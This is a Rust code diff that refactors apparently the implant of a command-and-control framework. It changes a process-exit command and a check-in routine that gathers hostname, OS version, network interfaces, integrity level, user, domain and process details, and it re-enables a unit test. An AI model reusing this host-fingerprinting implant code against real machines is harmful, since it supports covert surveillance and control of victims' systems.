@@ -1,8 +1,7 @@
-use core::ffi::c_void;
+use core::{ffi::c_void, fmt::Write as _};
 
 use kageshirei_communication_protocol::{
     communication::{Checkin, TaskOutput},
-    Metadata,
     NetworkInterface,
 };
 use libc_print::libc_println;
@@ -26,18 +25,17 @@ use crate::setup::system_data::checkin_from_raw;
 /// # Parameters
 /// - `exit_type`: Specifies the type of exit. If set to 1, the process is terminated.
 ///
-/// # NT API:
+/// # Notes:
 /// - Calls `NtTerminateProcess` from the Windows NT API.
-///
-/// # Safety
-/// - This function interacts with low-level NT APIs and terminates the process, which may lead to
-///   data loss or corruption if used improperly.
 pub fn command_exit(exit_type: i32) -> TaskOutput {
     // Example of an asynchronous operation before termination
     if exit_type == 1 {
         // The actual process termination remains a synchronous operation
         unsafe {
-            let ntstatus = instance().ntdll.nt_terminate_process.run(-1isize as _, 0);
+            let ntstatus = instance()
+                .ntdll
+                .nt_terminate_process
+                .run(-1isize as *mut c_void, 0);
 
             // Check if the termination was successful
             if ntstatus < 0 {
@@ -83,11 +81,6 @@ pub fn command_exit(exit_type: i32) -> TaskOutput {
 ///   - `ended_at`: A timestamp indicating when the operation ended.
 ///   - Additional metadata: The metadata used in the operation, captured during execution (e.g.,
 ///     request ID, agent ID).
-///
-/// # Safety
-/// This function uses several `unsafe` blocks to interact with system-level APIs and perform raw
-/// pointer dereferencing. The caller must ensure that the system and memory are in a valid state
-/// before calling this function.
 pub fn command_checkin() -> TaskOutput {
     let mut output = TaskOutput::new();
     output.started_at = Some(current_timestamp());
@@ -104,17 +97,15 @@ pub fn command_checkin() -> TaskOutput {
     };
 
     // Initialize a string to hold the hostname.
-    let mut hostname = String::new();
-    if success {
+    let hostname = if success {
         // Convert the computer name buffer (UTF-16) to a Rust `String`.
-        hostname = String::from_utf16_lossy(&buffer)
-            .trim_end_matches('\0') // Remove any trailing null characters.
-            .to_string();
+        String::from_utf16_lossy(&buffer)
+            .trim_end_matches('\0')
+            .to_owned()
     }
     else {
-        // Log an error if retrieving the computer name fails.
-        libc_println!("[!] get_computer_name_ex failed");
-    }
+        String::new()
+    };
 
     // Retrieve the operating system information from the PEB (Process Environment Block).
     let os_info_peb = unsafe { get_os() };
@@ -122,18 +113,18 @@ pub fn command_checkin() -> TaskOutput {
     // Retrieve more detailed operating system version information.
     let get_os_version_info_result = unsafe { get_os_version_info() };
     let mut operating_system = String::new();
-    if get_os_version_info_result.is_ok() {
-        let os_version_info = get_os_version_info_result.unwrap();
-
-        // Construct a string representing the operating system version.
-        operating_system.push_str(&format!(
+    if let Ok(os_version_info) = get_os_version_info_result {
+        if write!(
+            operating_system,
             "{} {}.{}.{} (Platform ID: {})",
             os_info_peb,
             os_version_info.dw_major_version,
             os_version_info.dw_minor_version,
             os_version_info.dw_build_number,
             os_version_info.dw_platform_id,
-        ));
+        )
+        .is_ok()
+        {}
     }
 
     // Retrieve information about the network adapters (e.g., IP addresses).
@@ -146,7 +137,7 @@ pub fn command_checkin() -> TaskOutput {
     let rid = unsafe { get_process_integrity(nt_current_process()) };
 
     // Create a `Checkin` object with the gathered metadata.
-    let mut checkin = unsafe {
+    let checkin = unsafe {
         Box::new(Checkin {
             operative_system: operating_system, // OS details.
             hostname,                           // Computer hostname.
@@ -163,7 +154,9 @@ pub fn command_checkin() -> TaskOutput {
     };
 
     // Set the `Checkin` data in the global instance for further access.
-    unsafe { instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void) };
+    unsafe {
+        instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void);
+    }
 
     // Safely get the check-in data and serialize it to a JSON string
     let output_str = unsafe { checkin_from_raw(instance().pcheckindata.as_mut().unwrap()) };
@@ -179,62 +172,49 @@ pub fn command_checkin() -> TaskOutput {
     output
 }
 
-// #[cfg(test)]
-// mod tests {
-//
-// use super::*;
-//
-// #[test]
-// fn test_checkin() {
-// let metadata = Metadata {
-// request_id: format!("req-{}", 1),
-// command_id: format!("cmd-{}", 1),
-// agent_id:   "agent-1234".to_string(),
-// path:       None,
-// };
-//
-// Test gathering system information and metadata for check-in
-// let result = command_checkin();
-//
-// Ensure the result is correct by checking if output is present
-// assert!(
-// result.output.is_some(),
-// "Check-in command output is missing"
-// );
-//
-// Retrieve the JSON output string from the TaskOutput
-// let json_output = result.output.unwrap();
-//
-// Ensure the JSON output contains expected fields
-// assert!(json_output.contains("hostname"), "Missing 'hostname' field");
-// assert!(
-// json_output.contains("operative_system"),
-// "Missing 'operative_system' field"
-// );
-// assert!(
-// json_output.contains("network_interfaces"),
-// "Missing 'network_interfaces' field"
-// );
-// assert!(
-// json_output.contains("process_id"),
-// "Missing 'process_id' field"
-// );
-// assert!(
-// json_output.contains("parent_process_id"),
-// "Missing 'parent_process_id' field"
-// );
-// assert!(
-// json_output.contains("integrity_level"),
-// "Missing 'integrity_level' field"
-// );
-// assert!(json_output.contains("domain"), "Missing 'domain' field");
-// assert!(json_output.contains("username"), "Missing 'username' field");
-// assert!(
-// json_output.contains("process_name"),
-// "Missing 'process_name' field"
-// );
-// assert!(json_output.contains("cwd"), "Missing 'cwd' field");
-//
-// Additional specific checks could be added, verifying actual values if needed
-// }
-// }
+#[cfg(test)]
+mod tests {
+
+    use super::*;
+
+    #[test]
+    fn test_checkin() {
+        // Test gathering system information and metadata for check-in
+        let result = command_checkin();
+
+        // Ensure the result is correct by checking if output is present
+        assert!(
+            result.output.is_some(),
+            "Check-in command output is missing"
+        );
+
+        // Retrieve the JSON output string from the TaskOutput
+        let json_output = result.output.unwrap();
+
+        // Ensure the JSON output contains expected fields
+        assert!(json_output.contains("hostname"), "Missing 'hostname' field");
+        assert!(
+            json_output.contains("operative_system"),
+            "Missing 'operative_system' field"
+        );
+        assert!(
+            json_output.contains("network_interfaces"),
+            "Missing 'network_interfaces' field"
+        );
+        assert!(json_output.contains("pid"), "Missing 'pid' field");
+        assert!(json_output.contains("ppid"), "Missing 'ppid' field");
+        assert!(
+            json_output.contains("integrity_level"),
+            "Missing 'integrity_level' field"
+        );
+        assert!(json_output.contains("domain"), "Missing 'domain' field");
+        assert!(json_output.contains("username"), "Missing 'username' field");
+        assert!(
+            json_output.contains("process_name"),
+            "Missing 'process_name' field"
+        );
+        assert!(json_output.contains("cwd"), "Missing 'cwd' field");
+
+        // Additional specific checks could be added, verifying actual values if needed
+    }
+}
